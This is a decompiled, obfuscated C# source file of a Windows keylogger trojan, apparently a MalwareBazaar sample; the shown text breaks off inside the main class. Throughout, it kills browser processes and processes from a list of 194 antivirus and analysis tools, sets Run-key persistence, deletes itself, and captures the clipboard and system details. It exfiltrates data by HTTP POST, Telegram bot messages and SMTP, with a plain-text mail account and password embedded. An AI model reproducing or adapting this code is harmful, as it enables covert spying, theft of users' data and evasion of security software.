// Decompiled with JetBrains decompiler
// Type: ˤׁ-޻.�ٗ׃�c
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-1f53f14c48ecd545980d315ae494ea6a2bd99fa1e9a3671debdf80626942bd2c.exe

using ˤׁ\u002D\u0097\u07BB;
using ɮҭ\uFFFDƚߡ;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Αʤ̧\uFFFD蠺;
using Ϙʤִۣۨ;

namespace ˤׁ\u002D\u0097\u07BB
{
  [StandardModule]
  internal sealed class \uFFFDٗ\u05C3\uFFFDc
  {
    public static string \u0089\uFFFD\uFFFD\u0040\u07B4;
    public static string ǎW̮Òå;
    public static string اЅ\u058Fʤ콪 = ".txt";
    private static Process[] \uF0B9ܪc\uDB17\uDED3 = Process.GetProcesses();
    private static string \u00AB\uFFFDݶ\uD9A6\uDF1A;
    private static string 嵱ã\uFFFDҟ\uFFFD;
    public static string ɩݝ盀şל;
    private static string ɩߟBۨУ;
    private static \uFFFDٗ\u05C3\uFFFDc.KeyLogger \uFFFDϒ\uFFFD\uFFFDŧ;
    private static StringBuilder ӤԜ\uFFFD\uFFFD\u0385;
    private static object ņЅ\uFFFDʤ\uFFFD;
    private static object \u0026K\uFFFD盀\uFFFD;
    private static object 쐬ܪ\uFFFDŴ\uF0B9;
    private static string ΑW\uF0B9퓜R;
    private static object \u00BEş\u0385ױņ;
    private static string 恁\uF0B9\uFFFDŁ\uFFFD;
    private static string \uFFFDtݶױǎ;
    private static string ܣƌŔ\uFFFDЮ;
    private static string \uFFFDɛ콪\uFFFDܣ;
    private static string \uFFFDɛۚεƟ;
    private static string 盀ִ\uFFFD븤ҟ;
    private static string 鈟\u0026\uFFFDZ恁;
    private static string թ\uFFFD\uFFFDŎ\uFFFD;
    private static string εOչéΩ;
    private static string \uFFFDΩҡҏé;
    private static string \uFFFD\uFFFD\u0026ۚ\u26CA;
    private static string \uFFFDۨ\uFFFD\u05C9O;
    public static string ЅӚˤʭ\uFFFD;
    private static object \uFFFDУŲ\u005E̱;

    static \uFFFDٗ\u05C3\uFFFDc()
    {
      \uFFFDٗ\u05C3\uFFFDc.اި\uFFFDcУ = new System.Windows.Forms.Timer();
      \uFFFDٗ\u05C3\uFFFDc.\uFFFD\uDAE4\uDC0B\uFFFDݝ = new System.Windows.Forms.Timer();
      \uFFFDٗ\u05C3\uFFFDc.ŎגҡʓΩ = new System.Windows.Forms.Timer();
      \uFFFDٗ\u05C3\uFFFDc.\u05C1ҚBϘj = new System.Windows.Forms.Timer();
      \uFFFDٗ\u05C3\uFFFDc.鈇뜸\uFFFD\uFFFDB = new System.Windows.Forms.Timer();
      \uFFFDٗ\u05C3\uFFFDc.Cϫ2\u05C3\uFFFD = new System.Windows.Forms.Timer();
      \uFFFDٗ\u05C3\uFFFDc.ܣZ\u0089̔é = new System.Windows.Forms.Timer();
      \uFFFDٗ\u05C3\uFFFDc.Ų\u061D\uFFFD\uFFFDŲ = new System.Windows.Forms.Timer();
      \uFFFDٗ\u05C3\uFFFDc.嵱ã\uFFFDҟ\uFFFD = "$%SMTPDV$";
      \uFFFDٗ\u05C3\uFFFDc.ɩݝ盀şל = "";
      \uFFFDٗ\u05C3\uFFFDc.ɩߟBۨУ = "$#TheHashHere%&";
      \uFFFDٗ\u05C3\uFFFDc.ӤԜ\uFFFD\uFFFD\u0385 = new StringBuilder();
      \uFFFDٗ\u05C3\uFFFDc.ņЅ\uFFFDʤ\uFFFD = (object) "False";
      \uFFFDٗ\u05C3\uFFFDc.\u0026K\uFFFD盀\uFFFD = (object) "False";
      \uFFFDٗ\u05C3\uFFFDc.쐬ܪ\uFFFDŴ\uF0B9 = (object) "False";
      \uFFFDٗ\u05C3\uFFFDc.ΑW\uF0B9퓜R = "$ProtectPass%";
      \uFFFDٗ\u05C3\uFFFDc.\u00BEş\u0385ױņ = (object) "ProtectFalse";
      \uFFFDٗ\u05C3\uFFFDc.恁\uF0B9\uFFFDŁ\uFFFD = "False";
      \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (" \r\n\r\nPC Name:" + Environment.MachineName), Operators.AddObject((object) "\r\nDate and Time: ", \uFFFDٗ\u05C3\uFFFDc.c盀\uFFFD\u05C9\uFFFD())), Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object) "\r\nClient IP: ", \uFFFDٗ\u05C3\uFFFDc.\uDAE4\uDC2Cޤ\u005E\uFFFD()), (object) "\r\n"), (object) "Country Name: "), \uFFFDٗ\u05C3\uFFFDc.չ̮é\uFFFD\u0609()), (object) "\r\n")));
      \uFFFDٗ\u05C3\uFFFDc.ܣƌŔ\uFFFDЮ = "hassan@a-standtasarim.com";
      \uFFFDٗ\u05C3\uFFFDc.\uFFFDɛ콪\uFFFDܣ = "Saba1234@@";
      \uFFFDٗ\u05C3\uFFFDc.\uFFFDɛۚεƟ = "mail.a-standtasarim.com";
      \uFFFDٗ\u05C3\uFFFDc.盀ִ\uFFFD븤ҟ = "sopnation@yandex.com";
      \uFFFDٗ\u05C3\uFFFDc.鈟\u0026\uFFFDZ恁 = "587";
      \uFFFDٗ\u05C3\uFFFDc.թ\uFFFD\uFFFDŎ\uFFFD = "";
      \uFFFDٗ\u05C3\uFFFDc.εOչéΩ = "";
      \uFFFDٗ\u05C3\uFFFDc.\uFFFDΩҡҏé = "";
      \uFFFDٗ\u05C3\uFFFDc.\uFFFD\uFFFD\u0026ۚ\u26CA = "";
      \uFFFDٗ\u05C3\uFFFDc.\uFFFDۨ\uFFFD\u05C9O = "";
      \uFFFDٗ\u05C3\uFFFDc.\uFFFDУŲ\u005E̱ = (object) ("ZyiAEnXWZP" + new Random().Next().ToString());
    }

    public static System.Windows.Forms.Timer اި\uFFFDcУ
    {
      get => \uFFFDٗ\u05C3\uFFFDc.\u061D\uFFFD\uFFFDz\u05C9;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(\uFFFDٗ\u05C3\uFFFDc.C\uFFFD\uFFFDCϒ);
        System.Windows.Forms.Timer z1 = \uFFFDٗ\u05C3\uFFFDc.\u061D\uFFFD\uFFFDz\u05C9;
        if (z1 != null)
          z1.Tick -= eventHandler;
        \uFFFDٗ\u05C3\uFFFDc.\u061D\uFFFD\uFFFDz\u05C9 = value;
        System.Windows.Forms.Timer z2 = \uFFFDٗ\u05C3\uFFFDc.\u061D\uFFFD\uFFFDz\u05C9;
        if (z2 == null)
          return;
        z2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer \uFFFD\uDAE4\uDC0B\uFFFDݝ
    {
      get => \uFFFDٗ\u05C3\uFFFDc.Ś\u07B4Ȩë\uFFFD;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(\uFFFDٗ\u05C3\uFFFDc.蠺Ӻۚ\uFFFD쐬);
        System.Windows.Forms.Timer śȨë1 = \uFFFDٗ\u05C3\uFFFDc.Ś\u07B4Ȩë\uFFFD;
        if (śȨë1 != null)
          śȨë1.Tick -= eventHandler;
        \uFFFDٗ\u05C3\uFFFDc.Ś\u07B4Ȩë\uFFFD = value;
        System.Windows.Forms.Timer śȨë2 = \uFFFDٗ\u05C3\uFFFDc.Ś\u07B4Ȩë\uFFFD;
        if (śȨë2 == null)
          return;
        śȨë2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer ŎגҡʓΩ
    {
      get => \uFFFDٗ\u05C3\uFFFDc.ޤߟ꼺ꓞt;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(\uFFFDٗ\u05C3\uFFFDc.\u07B8ܣ\uFFFDBΩ);
        System.Windows.Forms.Timer ޤߟ꼺ꓞt1 = \uFFFDٗ\u05C3\uFFFDc.ޤߟ꼺ꓞt;
        if (ޤߟ꼺ꓞt1 != null)
          ޤߟ꼺ꓞt1.Tick -= eventHandler;
        \uFFFDٗ\u05C3\uFFFDc.ޤߟ꼺ꓞt = value;
        System.Windows.Forms.Timer ޤߟ꼺ꓞt2 = \uFFFDٗ\u05C3\uFFFDc.ޤߟ꼺ꓞt;
        if (ޤߟ꼺ꓞt2 == null)
          return;
        ޤߟ꼺ꓞt2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer \u05C1ҚBϘj
    {
      get => \uFFFDٗ\u05C3\uFFFDc.\u05C3\uFFFD̔؜ۨ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(\uFFFDٗ\u05C3\uFFFDc.\uF0B9̲ݶӺӓ);
        System.Windows.Forms.Timer timer1 = \uFFFDٗ\u05C3\uFFFDc.\u05C3\uFFFD̔؜ۨ;
        if (timer1 != null)
          timer1.Tick -= eventHandler;
        \uFFFDٗ\u05C3\uFFFDc.\u05C3\uFFFD̔؜ۨ = value;
        System.Windows.Forms.Timer timer2 = \uFFFDٗ\u05C3\uFFFDc.\u05C3\uFFFD̔؜ۨ;
        if (timer2 == null)
          return;
        timer2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("kLLTIm")]
    public static System.Windows.Forms.Timer 鈇뜸\uFFFD\uFFFDB { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    public static System.Windows.Forms.Timer Cϫ2\u05C3\uFFFD
    {
      get => \uFFFDٗ\u05C3\uFFFDc.\u0089Π\u061DݝŔ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(\uFFFDٗ\u05C3\uFFFDc.\u0655\uFFFD\u0385\uDBB0\uDED3);
        System.Windows.Forms.Timer πݝŔ1 = \uFFFDٗ\u05C3\uFFFDc.\u0089Π\u061DݝŔ;
        if (πݝŔ1 != null)
          πݝŔ1.Tick -= eventHandler;
        \uFFFDٗ\u05C3\uFFFDc.\u0089Π\u061DݝŔ = value;
        System.Windows.Forms.Timer πݝŔ2 = \uFFFDٗ\u05C3\uFFFDc.\u0089Π\u061DݝŔ;
        if (πݝŔ2 == null)
          return;
        πݝŔ2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer ܣZ\u0089̔é
    {
      get => \uFFFDٗ\u05C3\uFFFDc.ЅӤ\u00ABϒٵ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(\uFFFDٗ\u05C3\uFFFDc.JՄ\u02F3\u061D\u00AB);
        System.Windows.Forms.Timer ѕӥϒٵ1 = \uFFFDٗ\u05C3\uFFFDc.ЅӤ\u00ABϒٵ;
        if (ѕӥϒٵ1 != null)
          ѕӥϒٵ1.Tick -= eventHandler;
        \uFFFDٗ\u05C3\uFFFDc.ЅӤ\u00ABϒٵ = value;
        System.Windows.Forms.Timer ѕӥϒٵ2 = \uFFFDٗ\u05C3\uFFFDc.ЅӤ\u00ABϒٵ;
        if (ѕӥϒٵ2 == null)
          return;
        ѕӥϒٵ2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("ProHfutimer")]
    public static System.Windows.Forms.Timer Ų\u061D\uFFFD\uFFFDŲ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    public static void \u06E8\uFFFD\uFFFDٵջ()
    {
      int num1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        int num4 = checked (\uFFFDٗ\u05C3\uFFFDc.\uF0B9ܪc\uDB17\uDED3.Length - 1);
        int index = 0;
        goto label_8;
label_4:
        num3 = 3;
        if (Operators.CompareString(Strings.LCase(\uFFFDٗ\u05C3\uFFFDc.\uF0B9ܪc\uDB17\uDED3[index].ProcessName), "chrome", false) != 0)
          goto label_6;
label_5:
        num3 = 5;
        \uFFFDٗ\u05C3\uFFFDc.\uF0B9ܪc\uDB17\uDED3[index].Kill();
label_6:
label_7:
        num3 = 8;
        checked { ++index; }
label_8:
        if (index <= num4)
          goto label_4;
        else
          goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
              case 6:
              case 7:
                goto label_6;
              case 5:
                goto label_5;
              case 8:
                goto label_7;
              case 9:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void Α\u061Dٷמ\u05C9()
    {
      int num1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        int num4 = checked (\uFFFDٗ\u05C3\uFFFDc.\uF0B9ܪc\uDB17\uDED3.Length - 1);
        int index = 0;
        goto label_8;
label_4:
        num3 = 3;
        if (Operators.CompareString(Strings.LCase(\uFFFDٗ\u05C3\uFFFDc.\uF0B9ܪc\uDB17\uDED3[index].ProcessName), "firefox", false) != 0)
          goto label_6;
label_5:
        num3 = 5;
        \uFFFDٗ\u05C3\uFFFDc.\uF0B9ܪc\uDB17\uDED3[index].Kill();
label_6:
label_7:
        num3 = 8;
        checked { ++index; }
label_8:
        if (index <= num4)
          goto label_4;
        else
          goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
              case 6:
              case 7:
                goto label_6;
              case 5:
                goto label_5;
              case 8:
                goto label_7;
              case 9:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void ݶіA\uFFFD̀()
    {
      string[] strArray1 = new string[194]
      {
        "zlclient",
        "egui",
        "bdagent",
        "npfmsg",
        "olydbg",
        "anubis",
        "wireshark",
        "avastui",
        "_Avp32",
        "vsmon",
        "mbam",
        "keyscrambler",
        "_Avpcc",
        "_Avpm",
        "Ackwin32",
        "Outpost",
        "Anti-Trojan",
        "ANTIVIR",
        "Apvxdwin",
        "ATRACK",
        "Autodown",
        "Avconsol",
        "Ave32",
        "Avgctrl",
        "Avkserv",
        "Avnt",
        "Avp",
        "Avp32",
        "Avpcc",
        "Avpdos32",
        "Avpm",
        "Avptc32",
        "Avpupd",
        "Avsched32",
        "AVSYNMGR",
        "Avwin95",
        "Avwupd32",
        "Blackd",
        "Blackice",
        "Cfiadmin",
        "Cfiaudit",
        "Cfinet",
        "Cfinet32",
        "Claw95",
        "Claw95cf",
        "Cleaner",
        "Cleaner3",
        "Defwatch",
        "Dvp95",
        "Dvp95_0",
        "Ecengine",
        "Esafe",
        "Espwatch",
        "F-Agnt95",
        "Findviru",
        "Fprot",
        "F-Prot",
        "F-Prot95",
        "Fp-Win",
        "Frw",
        "F-Stopw",
        "Iamapp",
        "Iamserv",
        "Ibmasn",
        "Ibmavsp",
        "Icload95",
        "Icloadnt",
        "Icmon",
        "Icsupp95",
        "Icsuppnt",
        "Iface",
        "Iomon98",
        "Jedi",
        "Lockdown2000",
        "Lookout",
        "Luall",
        "MCAFEE",
        "Moolive",
        "Mpftray",
        "N32scanw",
        "NAVAPSVC",
        "NAVAPW32",
        "NAVLU32",
        "Navnt",
        "NAVRUNR",
        "Navw32",
        "Navwnt",
        "NeoWatch",
        "NISSERV",
        "Nisum",
        "Nmain",
        "Normist",
        "NORTON",
        "Nupgrade",
        "Nvc95",
        "Outpost",
        "Padmin",
        "Pavcl",
        "Pavsched",
        "Pavw",
        "PCCIOMON",
        "PCCMAIN",
        "Pccwin98",
        "Pcfwallicon",
        "Persfw",
        "POP3TRAP",
        "PVIEW95",
        "Rav7",
        "Rav7win",
        "Rescue",
        "Safeweb",
        "Scan32",
        "Scan95",
        "Scanpm",
        "Scrscan",
        "Serv95",
        "Smc",
        "SMCSERVICE",
        "Snort",
        "Sphinx",
        "Sweep95",
        "SYMPROXYSVC",
        "Tbscan",
        "Tca",
        "Tds2-98",
        "Tds2-Nt",
        "TermiNET",
        "Vet95",
        "Vettray",
        "Vscan40",
        "Vsecomr",
        "Vshwin32",
        "Vsstat",
        "Webscanx",
        "WEBTRAP",
        "Wfindv32",
        "Zonealarm",
        "LOCKDOWN2000",
        "RESCUE32",
        "LUCOMSERVER",
        "avgcc",
        "avgcc",
        "avgamsvr",
        "avgupsvc",
        "avgw",
        "avgcc32",
        "avgserv",
        "avgserv9",
        "avgserv9schedapp",
        "avgemc",
        "ashwebsv",
        "ashdisp",
        "ashmaisv",
        "ashserv",
        "aswUpdSv",
        "symwsc",
        "norton",
        "Norton Auto-Protect",
        "norton_av",
        "nortonav",
        "ccsetmgr",
        "ccevtmgr",
        "avadmin",
        "avcenter",
        "avgnt",
        "avguard",
        "avnotify",
        "avscan",
        "guardgui",
        "nod32krn",
        "nod32kui",
        "clamscan",
        "clamTray",
        "clamWin",
        "freshclam",
        "oladdin",
        "sigtool",
        "w9xpopen",
        "Wclose",
        "cmgrdian",
        "alogserv",
        "mcshield",
        "vshwin32",
        "avconsol",
        "vsstat",
        "avsynmgr",
        "avcmd",
        "avconfig",
        "licmgr",
        "sched",
        "preupd",
        "MsMpEng",
        "MSASCui",
        "Avira.Systray"
      };
      Process[] processes = Process.GetProcesses();
      int index1 = 0;
      while (index1 < processes.Length)
      {
        Process process = processes[index1];
        string[] strArray2 = strArray1;
        int index2 = 0;
        while (index2 < strArray2.Length)
        {
          string Right = strArray2[index2];
          if (Operators.CompareString(process.ProcessName, Right, false) == 0)
          {
            process.Kill();
            break;
          }
          checked { ++index2; }
        }
        checked { ++index1; }
      }
    }

    public static object \uFFFDׁגŧ꾯(string 丐Ц؜鈟똛)
    {
      if (Process.GetProcessesByName(丐Ц؜鈟똛).Length > 0)
        Process.GetCurrentProcess().Kill();
      return (object) null;
    }

    public static object מϱ\uFFFD\u003B̳(string _param0)
    {
      if (System.IO.File.Exists(_param0))
        Process.GetCurrentProcess().Kill();
      return (object) null;
    }

    public static string \u005EӚ\uFFFD盀鈇(string ΩԜԜŚ㹃)
    {
      SHA256 shA256 = SHA256.Create();
      FileStream inputStream = System.IO.File.OpenRead(ΩԜԜŚ㹃);
      inputStream.Position = 0L;
      byte[] hash = shA256.ComputeHash((Stream) inputStream);
      inputStream.Close();
      string str = "";
      int num = checked (hash.Length - 1);
      int index = 0;
      while (index <= num)
      {
        str += hash[index].ToString("X2");
        checked { ++index; }
      }
      return str.ToLower();
    }

    public static void \uFFFDŎƚԹԹ()
    {
      try
      {
        Process.Start(new ProcessStartInfo()
        {
          Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true,
          FileName = "cmd.exe"
        });
        Environment.Exit(1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \uFFFḐRԌՕ(int _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

    [DllImport("kernel32", EntryPoint = "ExitProcess", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \u0385ΑJ\u1CFC\u07FB(uint _param0);

    [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \u060CɇľҢЅ([MarshalAs(UnmanagedType.LPTStr), In] string _param0, [MarshalAs(UnmanagedType.LPTStr), In] string ҟԌӥأ盀, long _param2);

    public static void UǎWtɇ()
    {
    }

    public static void \u05C3ęۨӥ\uF0B9(string ŲҚ㹃یٗ, string _param1)
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", true).SetValue(ŲҚ㹃یٗ, (object) _param1, RegistryValueKind.String);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void ڿ\u2964ߡΩ꾯(string _param0, string _param1, string _param2, string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param0, (object) _param1, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void \u02E8t\uDAD9\uDDB5\uFFFD(
      string _param0,
      string _param1,
      string _param2,
      string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param0, (object) _param1, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void \u0089ʭ̮\uFFFDЦ(
      string ﾭӤãӛا,
      string _param1,
      string _param2,
      string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) ﾭӤãӛا, (object) _param1, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void z\uFFFDK\uFFFD\uFFFD(
      byte[] _param0,
      string _param1,
      string _param2,
      string WľʭãҚ)
    {
      try
      {
        WebClient webClient = new WebClient();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = webClient.Encoding.GetString(_param0);
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param1, (object) _param2, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(WľʭãҚ, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ӥĂ嵱盀\uFFFD(string _param0, string _param1, string _param2)
    {
      try
      {
        string requestUriString = "https://api.telegram.org/bot" + _param0 + "/sendMessage?chat_id=" + _param1 + "&text=" + _param2;
        ServicePointManager.Expect100Continue = false;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUriString);
        string empty = string.Empty;
        try
        {
          using (Stream responseStream = httpWebRequest.GetResponse().GetResponseStream())
            new StreamReader(responseStream, Encoding.UTF8).ReadToEnd();
        }
        catch (WebException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          WebException webException = ex;
          empty = webException.Message.ToString();
          using (Stream responseStream = webException.Response.GetResponseStream())
            new StreamReader(responseStream, Encoding.GetEncoding("utf-8")).ReadToEnd();
          throw;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string \uFFFD̔ٷі쐬(string _param0, string _param1)
    {
      DESCryptoServiceProvider cryptoServiceProvider1 = new DESCryptoServiceProvider();
      MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
      byte[] destinationArray = new byte[8];
      Array.Copy((Array) cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(_param1)), 0, (Array) destinationArray, 0, 8);
      cryptoServiceProvider1.Key = destinationArray;
      cryptoServiceProvider1.Mode = CipherMode.ECB;
      ICryptoTransform encryptor = cryptoServiceProvider1.CreateEncryptor();
      byte[] bytes = Encoding.ASCII.GetBytes(_param0);
      return Convert.ToBase64String(encryptor.TransformFinalBlock(bytes, 0, bytes.Length));
    }

    public static object ҏ\uFFFDε嵱̧()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      long num;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.IsReady)
          checked { num += driveInfo.TotalSize; }
        checked { ++index; }
      }
      return (object) (Conversions.ToString(checked ((long) Math.Round(unchecked ((double) num / 1048576.0 / 1024.0)))) + " GB");
    }

    public static object c盀\uFFFD\u05C9\uFFFD() => (object) (Conversions.ToString(DateAndTime.Today) + " / " + Conversions.ToString(DateAndTime.TimeOfDay));

    public static object \uFFFDë\uFFFDᔖ\u003B() => (object) ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Info.OSFullName;

    public static object թ\uFFFDҟɩƚ() => (object) ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Info.OSVersion;

    public static object A츠ᔖ\uFFFDջ() => (object) string.Format("{0:f2} GB", (object) ((double) ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Info.TotalPhysicalMemory / 1073741824.0));

    public static object \uDAE4\uDC2Cޤ\u005E\uFFFD()
    {
      WebClient webClient = new WebClient();
      webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR1.0.3705;)");
      string address = "http://checkip.dyndns.org/";
      IWebProxy systemWebProxy = WebRequest.GetSystemWebProxy();
      systemWebProxy.Credentials = (ICredentials) CredentialCache.DefaultNetworkCredentials;
      webClient.Proxy = systemWebProxy;
      Stream stream;
      try
      {
        stream = webClient.OpenRead(address);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      StreamReader streamReader = new StreamReader(stream);
      string end = streamReader.ReadToEnd();
      stream.Close();
      streamReader.Close();
      return (object) end.Replace("<html><head><title>Current IP Check</title></head><body>", "").Replace("</body></html>", "").Replace("Current IP Address: ", "").ToString();
    }

    public static object չ̮é\uFFFD\u0609()
    {
      XmlDocument Instance = new XmlDocument();
      object obj = Operators.AddObject((object) "https://freegeoip.app/xml/", \uFFFDٗ\u05C3\uFFFDc.\uDAE4\uDC2Cޤ\u005E\uFFFD());
      object[] objArray;
      bool[] flagArray;
      NewLateBinding.LateCall((object) Instance, (System.Type) null, "Load", objArray = new object[1]
      {
        obj
      }, (string[]) null, (System.Type[]) null, flagArray = new bool[1]
      {
        true
      }, true);
      if (flagArray[0])
        RuntimeHelpers.GetObjectValue(objArray[0]);
      XmlNodeList elementsByTagName = Instance.GetElementsByTagName("CountryName");
      string str = "";
      try
      {
        foreach (XmlElement xmlElement in elementsByTagName)
          str = xmlElement.InnerText;
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return (object) str;
    }

    public static byte[] ɇş\uFFFD恁Α() => Encoding.Unicode.GetBytes("Clipboard | " + Environment.UserName + " | Snake\r\n" + \uFFFDٗ\u05C3\uFFFDc.\uFFFDtݶױǎ + "\r\n\r\n\r\n" + \uFFFDٗ\u05C3\uFFFDc.ɩݝ盀şל + "\r\n\r\n--------------------------------------------------");

    public static void \u07B8ܣ\uFFFDBΩ(object _param0, EventArgs _param1)
    {
      if (\uFFFDٗ\u05C3\uFFFDc.ɩݝ盀şל.ToString().Contains(ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Clipboard.GetText().Replace(".", "<.>").Replace("http", "<http>")))
        return;
      \uFFFDٗ\u05C3\uFFFDc.ɩݝ盀şל = \uFFFDٗ\u05C3\uFFFDc.ɩݝ盀şל + ʓ\uD95F\uDC77Śޤ.\u060CҚ쐬\u0385ٷ.Clipboard.GetText().Replace(".", "<.>").Replace("http", "<http>") + "\r\n";
    }

